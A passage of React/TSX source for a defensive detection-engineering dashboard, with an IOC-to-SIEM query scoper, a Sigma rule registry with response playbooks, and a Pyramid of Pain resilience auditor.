                            <p className="text-xs text-slate-300 leading-relaxed">{auditReport.gpo_remediation}</p>
                          </div>

                          {auditReport.sysmon_remediation && (
                            <div className="bg-[#05070c]/60 border border-slate-800/50 p-4 rounded-xl flex flex-col gap-2">
                              <span className="text-xs font-bold text-purple-300">⚙️ Sysmon Config Template Required</span>
                              <p className="text-xs text-slate-300 leading-relaxed">{auditReport.sysmon_remediation}</p>
                            </div>
                          )}
                        </div>
                      )}
                    </>
                  )}
                </div>
              </div>
            </>
          );
        })()}

        {/* Active Tab: IR FAST SCOPER */}
        {activeTab === 'ir_scoper' && (() => {
          const handleGenerateScoping = () => {
            const parseTokens = (txt: string) => txt.split(/[\n,]+/).map(t => t.trim()).filter(t => t !== "");
            const hosts = parseTokens(scoperHosts);
            const ips = parseTokens(scoperIps);
            const users = parseTokens(scoperUsers);
            const hashes = parseTokens(scoperHashes);
            
            const queries = generateScopingQueries(hosts, ips, users, hashes);
            setScoperQueries(queries);
          };

          const handleClearScoper = () => {
            setScoperHosts("");
            setScoperIps("");
            setScoperUsers("");
            setScoperHashes("");
            setScoperQueries(null);
          };

          return (
            <>
              <header className="border-b border-slate-800/60 pb-5">
                <h2 className="text-2xl font-bold tracking-tight text-white mb-1 flex items-center gap-2">
                  🚨 Incident Response Fast Scoper
                </h2>
                <p className="text-slate-400 text-sm max-w-4xl">
                  Instantly transform lists of Indicators of Compromise (IOCs) into optimized SIEM queries to verify host, network, credential, and process footprinting in seconds.
                </p>
              </header>

              <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                {/* Left Column: Inputs Form (Span 4) */}
                <div className="lg:col-span-4 flex flex-col gap-6">
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl flex flex-col gap-4">
                    <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block border-b border-slate-800/50 pb-2">
                      Input Indicators of Compromise
                    </span>

                    <div className="flex flex-col gap-1">
                      <label htmlFor="scoper-hosts" className="text-[0.7rem] font-bold text-slate-400 uppercase tracking-wider">Hosts (Target Names)</label>
                      <textarea 
                        id="scoper-hosts"
                        placeholder="e.g. WS-PROD-SRV01, DC-01"
                        value={scoperHosts}
                        onChange={(e) => setScoperHosts(e.target.value)}
                        className="bg-[#05070c] border border-slate-800 rounded-lg p-2 text-xs font-mono text-cyan-400 focus:outline-none focus:border-indigo-500 h-16 resize-none"
                      />
                    </div>

                    <div className="flex flex-col gap-1">
                      <label htmlFor="scoper-ips" className="text-[0.7rem] font-bold text-slate-400 uppercase tracking-wider">IP Addresses</label>
                      <textarea 
                        id="scoper-ips"
                        placeholder="e.g. 10.0.2.15, 192.168.10.45"
                        value={scoperIps}
                        onChange={(e) => setScoperIps(e.target.value)}
                        className="bg-[#05070c] border border-slate-800 rounded-lg p-2 text-xs font-mono text-cyan-400 focus:outline-none focus:border-indigo-500 h-16 resize-none"
                      />
                    </div>

                    <div className="flex flex-col gap-1">
                      <label htmlFor="scoper-users" className="text-[0.7rem] font-bold text-slate-400 uppercase tracking-wider">Usernames</label>
                      <textarea 
                        id="scoper-users"
                        placeholder="e.g. john.doe, administrator"
                        value={scoperUsers}
                        onChange={(e) => setScoperUsers(e.target.value)}
                        className="bg-[#05070c] border border-slate-800 rounded-lg p-2 text-xs font-mono text-cyan-400 focus:outline-none focus:border-indigo-500 h-16 resize-none"
                      />
                    </div>

                    <div className="flex flex-col gap-1">
                      <label htmlFor="scoper-hashes" className="text-[0.7rem] font-bold text-slate-400 uppercase tracking-wider">Process Hashes (SHA256)</label>
                      <textarea 
                        id="scoper-hashes"
                        placeholder="e.g. e2c39d82fb10a459b9cd837de..."
                        value={scoperHashes}
                        onChange={(e) => setScoperHashes(e.target.value)}
                        className="bg-[#05070c] border border-slate-800 rounded-lg p-2 text-xs font-mono text-cyan-400 focus:outline-none focus:border-indigo-500 h-16 resize-none"
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-3 mt-2">
                      <button 
                        onClick={handleClearScoper}
                        className="bg-slate-900 border border-slate-800 text-slate-400 hover:text-white hover:border-slate-700 font-bold text-xs py-2.5 rounded-lg transition-all cursor-pointer text-center"
                      >
                        Clear All
                      </button>
                      <button 
                        onClick={handleGenerateScoping}
                        className="bg-gradient-to-r from-indigo-500 to-purple-600 hover:brightness-110 text-white font-bold text-xs py-2.5 rounded-lg transition-all shadow-md shadow-indigo-500/20 cursor-pointer"
                      >
                        Generate Query
                      </button>
                    </div>
                  </div>
                </div>

                {/* Right Column: Output Queries (Span 8) */}
                <div className="lg:col-span-8 flex flex-col gap-6">
                  {!scoperQueries ? (
                    <div className="bg-[#0d111c]/40 border border-dashed border-slate-800 rounded-2xl p-12 text-center text-slate-500 flex flex-col items-center gap-3 justify-center min-h-[400px]">
                      <span className="text-4xl">🚨</span>
                      <p className="text-sm">Input at least one IOC and click "Generate Query" to build optimized incident scoper scripts.</p>
                    </div>
                  ) : (
                    <>
                      {/* Splunk Scoping Card */}
                      <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl flex flex-col">
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <span className="text-lg">🪵</span>
                            <span className="text-xs font-bold text-slate-300 uppercase tracking-wider">Splunk SPL Scoping Script</span>
                          </div>
                          <button 
                            id="copy-scoper-splunk"
                            onClick={() => handleCopyCommand(scoperQueries.splunk, "copy-scoper-splunk")}
                            className="text-[0.7rem] bg-indigo-600 hover:bg-indigo-500 border border-indigo-500/30 text-white font-semibold px-2.5 py-1 rounded transition-all cursor-pointer"
                          >
                            Copy Query
                          </button>
                        </div>
                        <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-cyan-400 overflow-x-auto whitespace-pre-wrap leading-relaxed select-all">
                          {scoperQueries.splunk}
                        </pre>
                      </div>

                      {/* KQL Scoping Card */}
                      <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 backdrop-blur-xl flex flex-col">
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <span className="text-lg">☁️</span>
                            <span className="text-xs font-bold text-slate-300 uppercase tracking-wider">Sentinel KQL Scoping Script</span>
                          </div>
                          <button 
                            id="copy-scoper-kql"
                            onClick={() => handleCopyCommand(scoperQueries.kql, "copy-scoper-kql")}
                            className="text-[0.7rem] bg-indigo-600 hover:bg-indigo-500 border border-indigo-500/30 text-white font-semibold px-2.5 py-1 rounded transition-all cursor-pointer"
                          >
                            Copy Query
                          </button>
                        </div>
                        <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-purple-300 overflow-x-auto whitespace-pre-wrap leading-relaxed select-all">
                          {scoperQueries.kql}
                        </pre>
                      </div>
                    </>
                  )}
                </div>
              </div>
            </>
          );
        })()}

        {/* Active Tab: RULES DATABASE (Tab 2) */}
        {activeTab === 'detections' && (
          <div className="flex flex-col gap-8">
            {/* Section 1: Custom Athena DaC Rules Registry */}
            <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6">
              <header className="border-b border-slate-800/60 pb-5 mb-6 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
                <div>
                  <h2 className="text-xl font-bold text-white mb-1 flex items-center gap-2">
                    🛡️ Active Project Athena Rules Registry
                  </h2>
                  <p className="text-slate-400 text-xs">
                    Inspect the production-grade threat detection rules we engineered. Click a rule row to inspect its raw Sigma YAML spec and live SIEM query compilation pipelines.
                  </p>
                </div>
                <button
                  onClick={() => {
                    setPlaygroundTemplate("process_creation");
                    setActiveTab("playground");
                  }}
                  className="bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold px-3.5 py-2 rounded-lg transition-all shadow-md shadow-emerald-500/20 flex items-center gap-1.5 cursor-pointer shrink-0"
                >
                  <span>➕</span> Write New Detection
                </button>
              </header>

              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs border-collapse">
                  <thead>
                    <tr className="text-slate-400 border-b border-slate-800 text-[0.7rem] uppercase tracking-wider font-semibold">
                      <th className="py-3 px-4 w-[40px]"></th>
                      <th className="py-3 px-4">Rule Name</th>
                      <th className="py-3 px-4">Severity</th>
                      <th className="py-3 px-4">Category</th>
                      <th className="py-3 px-4">Log Source</th>
                      <th className="py-3 px-4">Resilience / Pain Level</th>
                      <th className="py-3 px-4">ATT&CK Tags</th>
                    </tr>
                  </thead>
                  <tbody>
                    {registeredRules.map((rule) => {
                      const isExpanded = expandedRuleIds.has(rule.id);
                      const toggleExpand = () => {
                        const next = new Set(expandedRuleIds);
                        if (next.has(rule.id)) {
                          next.delete(rule.id);
                        } else {
                          next.add(rule.id);
                        }
                        setExpandedRuleIds(next);
                      };

                      const attackTags = rule.tags.filter(t => t.startsWith('attack.'));

                      return (
                        <>
                          <tr 
                            key={rule.id} 
                            onClick={toggleExpand}
                            className="border-b border-slate-800/60 hover:bg-slate-800/10 transition-colors cursor-pointer select-none"
                          >
                            <td className="py-4 px-4 text-center text-slate-500 text-xs">
                              {isExpanded ? "▼" : "▶"}
                            </td>
                            <td className="py-4 px-4 font-semibold text-slate-100">{rule.title}</td>
                            <td className="py-4 px-4">
                              <span className={`text-[0.62rem] font-bold uppercase tracking-wider px-2 py-0.5 rounded border ${
                                rule.severity === 'critical' ? 'bg-rose-500/10 text-rose-400 border-rose-500/20' : 
                                rule.severity === 'high' ? 'bg-amber-500/10 text-amber-400 border-amber-500/20' : 
                                'bg-blue-500/10 text-blue-400 border-blue-500/20'
                              }`}>
                                {rule.severity}
                              </span>
                            </td>
                            <td className="py-4 px-4 text-slate-300 capitalize">{rule.logsource.category}</td>
                            <td className="py-4 px-4 font-mono text-[0.7rem] text-slate-400">
                              {rule.logsource.product}:{rule.logsource.service}
                            </td>
                            <td className="py-4 px-4">
                              <span className={`text-[0.62rem] font-bold uppercase tracking-wider px-2 py-0.5 rounded border ${analyzeRuleResilience(rule).colorClass}`}>
                                {analyzeRuleResilience(rule).resilience} ({analyzeRuleResilience(rule).level})
                              </span>
                            </td>
                            <td className="py-4 px-4">
                              <div className="flex flex-wrap gap-1">
                                {attackTags.map(tag => (
                                  <span key={tag} className="bg-indigo-500/10 text-indigo-300 border border-indigo-500/20 px-2 py-0.5 rounded font-mono text-[0.64rem] font-semibold">
                                    {tag.replace('attack.', '').toUpperCase()}
                                  </span>
                                ))}
                              </div>
                            </td>
                          </tr>

                          {isExpanded && (
                            <tr key={`${rule.id}-expanded`}>
                              <td colSpan={7} className="bg-black/30 px-6 py-5 border-b border-slate-800/60">
                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 text-xs">
                                  {/* Left: Palantir ADS Specification */}
                                  <div className="flex flex-col gap-4 bg-[#0d111c]/50 border border-slate-800/60 p-5 rounded-2xl">
                                    <span className="font-bold text-indigo-400 uppercase tracking-wider text-[0.7rem] block border-b border-slate-800 pb-2 flex items-center gap-1.5">
                                      <span>📋</span> Palantir Alerting & Detection Strategy (ADS)
                                    </span>
                                    
                                    <div>
                                      <span className="text-[0.65rem] font-bold text-slate-500 uppercase tracking-wider block mb-1">Goal</span>
                                      <p className="text-slate-300 leading-relaxed text-[0.72rem]">{rule.description}</p>
                                    </div>

                                    <div>
                                      <span className="text-[0.65rem] font-bold text-slate-500 uppercase tracking-wider block mb-1">Categorization</span>
                                      <div className="flex flex-wrap gap-1.5 mt-1">
                                        <span className="bg-indigo-500/10 text-indigo-300 border border-indigo-500/20 px-2 py-0.5 rounded font-mono text-[0.66rem] font-semibold">
                                          Tactic: {rule.tags.find(t => t.includes('credential')) ? 'Credential Access' : rule.tags.find(t => t.includes('persistence')) ? 'Persistence' : rule.tags.find(t => t.includes('evasion')) ? 'Defense Evasion' : 'Command & Control'}
                                        </span>
                                        {attackTags.map(tag => (
                                          <span key={tag} className="bg-slate-800 text-slate-300 px-2 py-0.5 rounded font-mono text-[0.66rem] border border-slate-700/50">
                                            {tag}
                                          </span>
                                        ))}
                                      </div>
                                    </div>

                                    <div>
                                      <span className="text-[0.65rem] font-bold text-slate-500 uppercase tracking-wider block mb-1.5">Known False Positives</span>
                                      <ul className="list-disc list-inside text-slate-400 flex flex-col gap-1 text-[0.7rem] leading-normal pl-1">
                                        {rule.false_positives.map((fp, idx) => (
                                          <li key={idx}>{fp}</li>
                                        ))}
                                      </ul>
                                    </div>

                                    <div>
                                      <span className="text-[0.65rem] font-bold text-slate-500 uppercase tracking-wider block mb-1.5">Incident Response Playbook</span>
                                      <div className="flex flex-col gap-2 bg-[#05070c]/50 p-3 rounded-lg border border-slate-800/80">
                                        <span className="text-[0.72rem] font-bold text-indigo-300">
                                          Action: {rule.remediation.title}
                                        </span>
                                        <ol className="list-decimal list-inside text-slate-400 flex flex-col gap-1 text-[0.7rem] leading-normal pl-1">
                                          {rule.remediation.steps.map((step, idx) => (
                                            <li key={idx}>{step}</li>
                                          ))}
                                        </ol>
                                      </div>
                                    </div>

                                    <div>
                                      <span className="text-[0.65rem] font-bold text-slate-500 uppercase tracking-wider block mb-1">Blind Spots & Assumptions</span>
                                      <p className="text-slate-400 leading-normal text-[0.7rem]">
                                        Assumes active collection of logs from <span className="font-mono text-cyan-400 bg-slate-900 border border-slate-800 px-1 py-0.5 rounded">{rule.logsource.product}:{rule.logsource.service}</span>. Obfuscated process execution arguments or secondary memory bypasses might not trigger matching criteria.
                                      </p>
                                    </div>
                                  </div>

                                  {/* Right: Technical Assets (YAML & Compiled Queries) */}
                                  <div className="flex flex-col gap-5">
                                    {/* Sigma YAML */}
                                    <div className="flex flex-col gap-2">
                                      <div className="flex justify-between items-center">
                                        <span className="font-bold text-slate-300 uppercase tracking-wider text-[0.68rem] block flex items-center gap-1">
                                          <span>📝</span> Sigma YAML Specification
                                        </span>
                                        <button 
                                          onClick={(e) => {
                                            e.stopPropagation();
                                            handleCopyCommand(rule.yaml_string, `copy-db-yaml-${rule.id}`);
                                          }}
                                          id={`copy-db-yaml-${rule.id}`}
                                          className="text-[0.66rem] bg-slate-900 border border-slate-800 text-slate-400 hover:text-white px-2 py-0.5 rounded transition-all cursor-pointer"
                                        >
                                          Copy YAML
                                        </button>
                                      </div>
                                      <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-indigo-300 overflow-x-auto whitespace-pre leading-relaxed select-all">
                                        {rule.yaml_string}
                                      </pre>
                                    </div>

                                    {/* Compiled SIEM Queries */}
                                    <div className="flex flex-col gap-3">
                                      <span className="font-bold text-slate-300 uppercase tracking-wider text-[0.68rem] block border-b border-slate-800 pb-1.5 flex items-center gap-1">
                                        <span>⚙️</span> Compiled SIEM Translation Pipelines
                                      </span>

                                      {/* Splunk */}
                                      <div className="flex flex-col gap-1">
                                        <div className="flex justify-between items-center">
                                          <span className="text-[0.65rem] text-slate-500 uppercase tracking-wide font-mono">Splunk SPL</span>
                                          <button 
                                            onClick={(e) => {
                                              e.stopPropagation();
                                              handleCopyCommand(compileToSplunk(rule), `copy-db-splunk-${rule.id}`);
                                            }}
                                            id={`copy-db-splunk-${rule.id}`}
                                            className="text-[0.62rem] text-cyan-400 hover:text-cyan-300 cursor-pointer"
                                          >
                                            Copy Query
                                          </button>
                                        </div>
                                        <pre className="bg-[#05070c] border border-slate-800/80 p-3 rounded-lg text-[0.7rem] font-mono text-cyan-400 overflow-x-auto whitespace-pre-wrap leading-relaxed select-all">
                                          {compileToSplunk(rule)}
                                        </pre>
                                      </div>

                                      {/* KQL */}
                                      <div className="flex flex-col gap-1">
                                        <div className="flex justify-between items-center">
                                          <span className="text-[0.65rem] text-slate-500 uppercase tracking-wide font-mono">Microsoft Sentinel KQL</span>
                                          <button 
                                            onClick={(e) => {
                                              e.stopPropagation();
                                              handleCopyCommand(compileToKql(rule), `copy-db-kql-${rule.id}`);
                                            }}
                                            id={`copy-db-kql-${rule.id}`}
                                            className="text-[0.62rem] text-purple-400 hover:text-purple-300 cursor-pointer"
                                          >
                                            Copy Query
                                          </button>
                                        </div>
                                        <pre className="bg-[#05070c] border border-slate-800/80 p-3 rounded-lg text-[0.7rem] font-mono text-purple-300 overflow-x-auto whitespace-pre-wrap leading-relaxed select-all">
                                          {compileToKql(rule)}
                                        </pre>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </td>
                            </tr>
                          )}
                        </>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </div>

            {/* Section 2: Reference SIEM Rules Database */}
            <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6">
              <header className="border-b border-slate-800/60 pb-5 mb-6">
                <h2 className="text-xl font-bold text-white mb-1">
                  🔍 Reference SIEM Detections Database
                </h2>
                <p className="text-slate-400 text-xs">
                  Browse generic reference rules ingested into the SIEM and their required telemetry components.
                </p>
              </header>

              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs border-collapse">
                  <thead>
                    <tr className="text-slate-400 border-b border-slate-800 text-[0.7rem] uppercase tracking-wider font-semibold">
                      <th className="py-3 px-4">Rule Name</th>
                      <th className="py-3 px-4">Platform</th>
                      <th className="py-3 px-4">Language</th>
                      <th className="py-3 px-4">ATT&CK Mapping</th>
                      <th className="py-3 px-4">Required Telemetry</th>
                    </tr>
                  </thead>
                  <tbody>
                    {elasticDetections.map((rule) => (
                      <tr key={rule.rule_name} className="border-b border-slate-800/60 hover:bg-slate-800/10 transition-colors">
                        <td className="py-4 px-4 font-semibold text-slate-100">{rule.rule_name}</td>
                        <td className="py-4 px-4 text-slate-300">{rule.platform}</td>
                        <td className="py-4 px-4 text-slate-400 font-mono">{rule.query_language}</td>
                        <td className="py-4 px-4">
                          <span className="bg-indigo-500/10 text-indigo-300 border border-indigo-500/20 px-2 py-0.5 rounded font-mono text-[0.68rem] font-semibold">
                            {rule.mapped_technique}
                          </span>
                        </td>
                        <td className="py-4 px-4">
                          <div className="flex flex-wrap gap-1.5">
                            {rule.required_telemetry.map((telemetry) => (
                              <span key={telemetry} className="bg-slate-800 text-slate-300 px-2 py-0.5 rounded text-[0.66rem] border border-slate-700/50">
                                {telemetry}
                              </span>
                            ))}
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {/* Active Tab: RESILIENCE & AXIOMS */}
        {activeTab === 'resilience' && (() => {
          let auditedRule: Rule;
          let parseError: string | null = null;
          
          if (resilienceTabMode === 'registry') {
            const registryRule = registeredRules.find(r => r.id === resilienceRuleId) || registeredRules[0];
            auditedRule = registryRule;
          } else {
            try {
              auditedRule = parseYamlRule(resilienceYaml);
            } catch (e: any) {
              parseError = e.message;
              auditedRule = {
                ...registeredRules[0],
                title: "Malformed Custom Rule",
                yaml_string: resilienceYaml
              };
            }
          }

          const report = analyzeRuleResilience(auditedRule);

          return (
            <>
              <header className="border-b border-slate-800/60 pb-5">
                <h2 className="text-2xl font-bold tracking-tight text-white mb-1 flex items-center gap-2">
                  📐 Resilience Auditor & Operational Axioms
                </h2>
                <p className="text-slate-400 text-sm max-w-4xl">
                  Evaluate detection resilience on the Pyramid of Pain (from trivial Hash lists to resilient behavioral TTPs). Review our 10 operational axioms for high-impact engineering.
                </p>
              </header>

              <div className="grid grid-cols-1 xl:grid-cols-12 gap-8">
                
                {/* Left Column: Rule Selector & Auditor Summary (Span 5) */}
                <div className="xl:col-span-5 flex flex-col gap-6">
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-4">
                    
                    {/* Tab Mode Toggle */}
                    <div className="flex bg-[#05070c] p-1 rounded-lg border border-slate-800/80">
                      <button
                        onClick={() => setResilienceTabMode('registry')}
                        className={`flex-1 text-center py-1.5 rounded-md text-xs font-semibold transition-all ${resilienceTabMode === 'registry' ? 'bg-indigo-600 text-white shadow' : 'text-slate-400 hover:text-slate-200'}`}
                      >
                        Production Registry
                      </button>
                      <button
                        onClick={() => setResilienceTabMode('custom')}
                        className={`flex-1 text-center py-1.5 rounded-md text-xs font-semibold transition-all ${resilienceTabMode === 'custom' ? 'bg-indigo-600 text-white shadow' : 'text-slate-400 hover:text-slate-200'}`}
                      >
                        Custom Sigma Editor
                      </button>
                    </div>

                    {/* Selector or Editor conditional inputs */}
                    {resilienceTabMode === 'registry' ? (
                      <div>
                        <label htmlFor="resilience-rule-select" className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-2">
                          Select Registered Rule
                        </label>
                        <select 
                          id="resilience-rule-select"
                          value={resilienceRuleId}
                          onChange={(e) => setResilienceRuleId(e.target.value)}
                          className="w-full bg-[#05070c] border border-slate-800 text-slate-200 rounded-lg p-2.5 text-xs focus:outline-none focus:border-indigo-500 cursor-pointer"
                        >
                          {registeredRules.map(r => (
                            <option key={r.id} value={r.id}>{r.title}</option>
                          ))}
                        </select>
                      </div>
                    ) : (
                      <div className="flex flex-col gap-2">
                        <div className="flex justify-between items-center">
                          <span className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono">Sigma YAML Editor</span>
                          {parseError ? (
                            <span className="text-[0.65rem] bg-rose-500/10 text-rose-400 border border-rose-500/20 px-2 py-0.5 rounded font-mono font-semibold">
                              Malformed YAML
                            </span>
                          ) : (
                            <span className="text-[0.65rem] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded font-mono font-semibold">
                              YAML Valid
                            </span>
                          )}
                        </div>
                        <textarea
                          value={resilienceYaml}
                          onChange={(e) => setResilienceYaml(e.target.value)}
                          className="w-full bg-[#05070c] border border-slate-800 rounded-xl p-3.5 text-[0.72rem] font-mono text-indigo-300 focus:outline-none focus:border-indigo-500 resize-none h-[180px]"
                          placeholder="Paste your Sigma YAML here to audit..."
                        />
                        {parseError && (
                          <div className="bg-rose-950/20 border border-rose-500/30 text-rose-400 p-2.5 rounded-lg text-[0.7rem] font-mono leading-normal">
                            Error: {parseError}
                          </div>
                        )}
                      </div>
                    )}
                  </div>

                  {/* Audit Metrics Panel */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 flex flex-col gap-4 backdrop-blur-xl">
                    <h3 className="text-xs font-bold text-slate-300 uppercase tracking-wider border-b border-slate-800 pb-2 flex items-center justify-between">
                      <span>📐 Resilience Audit Report</span>
                      <span className={`text-[0.62rem] font-bold uppercase tracking-wider px-2 py-0.5 rounded border ${report.colorClass}`}>
                        {report.resilience}
                      </span>
                    </h3>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="bg-[#05070c]/50 border border-slate-800/60 p-3.5 rounded-xl">
                        <span className="text-[0.65rem] text-slate-500 uppercase tracking-wider block">Pyramid Level</span>
                        <span className="text-sm font-bold text-white mt-1 block">{report.level}</span>
                      </div>
                      <div className="bg-[#05070c]/50 border border-slate-800/60 p-3.5 rounded-xl">
                        <span className="text-[0.65rem] text-slate-500 uppercase tracking-wider block">Resilience Score</span>
                        <span className="text-sm font-bold text-white mt-1 block font-mono">{report.score} / 6</span>
                      </div>
                    </div>

                    <div>
                      <span className="text-[0.65rem] text-slate-500 uppercase tracking-wider block mb-1">Technical Audit Details</span>
                      <p className="text-xs text-slate-300 leading-relaxed bg-[#05070c]/30 border border-slate-800/50 p-3 rounded-xl">
                        {report.explanation}
                      </p>
                    </div>

                    <div>
                      <span className="text-[0.65rem] text-slate-500 uppercase tracking-wider block mb-1.5">Actionable Recommendations to Summit the Pyramid</span>
                      <ul className="flex flex-col gap-2">
                        {report.recommendations.map((rec, index) => (
                          <li key={index} className="text-xs text-slate-400 flex gap-2">
                            <span className="text-indigo-400 font-bold">»</span>
                            <span className="leading-normal">{rec}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </div>
                </div>

                {/* Right Column: 3D Pyramid of Pain Visualization & Axioms Carousel (Span 7) */}
                <div className="xl:col-span-7 flex flex-col gap-8">
                  
                  {/* Pyramid of Pain stack visualizer */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 flex flex-col md:flex-row items-center gap-8 backdrop-blur-xl">
                    
                    {/* Pyramid container */}
                    <div className="flex-1 w-full flex flex-col items-center justify-center py-4 relative">
                      
                      <div 
                        className="w-full max-w-[320px] flex flex-col gap-2"
                        style={{ 
                          perspective: '800px',
                          transformStyle: 'preserve-3d' 
                        }}
                      >
                        {/* Layer 6: TTPs */}
                        <div 
                          className={`relative py-3 rounded-lg border text-center transition-all duration-300 select-none ${
                            report.score === 6 
                              ? 'bg-emerald-500/20 border-emerald-400 text-white font-bold scale-[1.03] shadow-lg shadow-emerald-500/20' 
                              : 'bg-[#101625]/60 border-slate-800/50 text-slate-500 opacity-45 scale-[0.98]'
                          }`}
                          style={{
                            transform: `rotateX(20deg) translateZ(${report.score === 6 ? '15px' : '0px'})`,
                            clipPath: 'polygon(20% 0%, 80% 0%, 90% 100%, 10% 100%)'
                          }}
                        >
                          <span className="text-[0.68rem] tracking-widest block uppercase font-mono mb-0.5 text-slate-400">Tough</span>
                          <span className="text-xs tracking-wider">6. TTPs / Behaviors</span>
                        </div>

                        {/* Layer 5: Tools */}
                        <div 
                          className={`relative py-3 rounded-lg border text-center transition-all duration-300 select-none ${
                            report.score === 5 
                              ? 'bg-emerald-500/20 border-emerald-400 text-white font-bold scale-[1.03] shadow-lg shadow-emerald-500/20' 
                              : 'bg-[#101625]/60 border-slate-800/50 text-slate-500 opacity-45 scale-[0.98]'
                          }`}
                          style={{
                            transform: `rotateX(20deg) translateZ(${report.score === 5 ? '15px' : '0px'})`,
                            clipPath: 'polygon(15% 0%, 85% 0%, 93% 100%, 7% 100%)'
                          }}
                        >
                          <span className="text-[0.68rem] tracking-widest block uppercase font-mono mb-0.5 text-slate-400">Challenging</span>
                          <span className="text-xs tracking-wider">5. Tools</span>
                        </div>

                        {/* Layer 4: Host/Network Artifacts */}
                        <div 
                          className={`relative py-3 rounded-lg border text-center transition-all duration-300 select-none ${
                            report.score === 4 
                              ? 'bg-cyan-500/20 border-cyan-400 text-white font-bold scale-[1.03] shadow-lg shadow-cyan-500/20' 
                              : 'bg-[#101625]/60 border-slate-800/50 text-slate-500 opacity-45 scale-[0.98]'
                          }`}
                          style={{
                            transform: `rotateX(20deg) translateZ(${report.score === 4 ? '15px' : '0px'})`,
                            clipPath: 'polygon(10% 0%, 90% 0%, 96% 100%, 4% 100%)'
                          }}
                        >
                          <span className="text-[0.68rem] tracking-widest block uppercase font-mono mb-0.5 text-slate-400">Annoying</span>
                          <span className="text-xs tracking-wider">4. Host / Network Artifacts</span>
                        </div>

                        {/* Layer 3: Domain Names */}
                        <div 
                          className={`relative py-3 rounded-lg border text-center transition-all duration-300 select-none ${
                            report.score === 3 
                              ? 'bg-blue-500/20 border-blue-400 text-white font-bold scale-[1.03] shadow-lg shadow-blue-500/20' 
                              : 'bg-[#101625]/60 border-slate-800/50 text-slate-500 opacity-45 scale-[0.98]'
                          }`}
                          style={{
                            transform: `rotateX(20deg) translateZ(${report.score === 3 ? '15px' : '0px'})`,
                            clipPath: 'polygon(7% 0%, 93% 0%, 98% 100%, 2% 100%)'
                          }}
                        >
                          <span className="text-[0.68rem] tracking-widest block uppercase font-mono mb-0.5 text-slate-400">Simple</span>
                          <span className="text-xs tracking-wider">3. Domain Names</span>
                        </div>

                        {/* Layer 2: IP Addresses */}
                        <div 
                          className={`relative py-3 rounded-lg border text-center transition-all duration-300 select-none ${
                            report.score === 2 
                              ? 'bg-amber-500/20 border-amber-400 text-white font-bold scale-[1.03] shadow-lg shadow-amber-500/20' 
                              : 'bg-[#101625]/60 border-slate-800/50 text-slate-500 opacity-45 scale-[0.98]'
                          }`}
                          style={{
                            transform: `rotateX(20deg) translateZ(${report.score === 2 ? '15px' : '0px'})`,
                            clipPath: 'polygon(4% 0%, 96% 0%, 99% 100%, 1% 100%)'
                          }}
                        >
                          <span className="text-[0.68rem] tracking-widest block uppercase font-mono mb-0.5 text-slate-400">Easy</span>
                          <span className="text-xs tracking-wider">2. IP Addresses</span>
                        </div>

                        {/* Layer 1: Hash Values */}
                        <div 
                          className={`relative py-3 rounded-lg border text-center transition-all duration-300 select-none ${
                            report.score === 1 
                              ? 'bg-rose-500/20 border-rose-400 text-white font-bold scale-[1.03] shadow-lg shadow-rose-500/20' 
                              : 'bg-[#101625]/60 border-slate-800/50 text-slate-500 opacity-45 scale-[0.98]'
                          }`}
                          style={{
                            transform: `rotateX(20deg) translateZ(${report.score === 1 ? '15px' : '0px'})`,
                            clipPath: 'polygon(2% 0%, 98% 0%, 100% 100%, 0% 100%)'
                          }}
                        >
                          <span className="text-[0.68rem] tracking-widest block uppercase font-mono mb-0.5 text-slate-400">Trivial</span>
                          <span className="text-xs tracking-wider">1. Hash Values</span>
                        </div>
                      </div>
                    </div>

                    {/* Gauge and numeric stats */}
                    <div className="w-full md:w-[220px] flex flex-col gap-4 border-t md:border-t-0 md:border-l border-slate-800/80 pt-5 md:pt-0 md:pl-6">
                      <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block">Pyramid Scoreboard</span>
                      
                      <div className="flex flex-col gap-1">
                        <span className="text-[0.65rem] text-slate-500 uppercase tracking-wider font-semibold">Resilience Level</span>
                        <span className={`text-xl font-bold font-mono ${report.score >= 5 ? 'text-emerald-400' : report.score === 4 ? 'text-cyan-400' : report.score === 3 ? 'text-blue-400' : report.score === 2 ? 'text-amber-400' : 'text-rose-400'}`}>
                          {report.resilience}
                        </span>
                      </div>

                      <div className="flex flex-col gap-1">
                        <span className="text-[0.65rem] text-slate-500 uppercase tracking-wider font-semibold">Active Pain Index</span>
                        <div className="flex items-center gap-3">
                          <div className="w-full bg-[#05070c] rounded-full h-2.5 border border-slate-800">
                            <div 
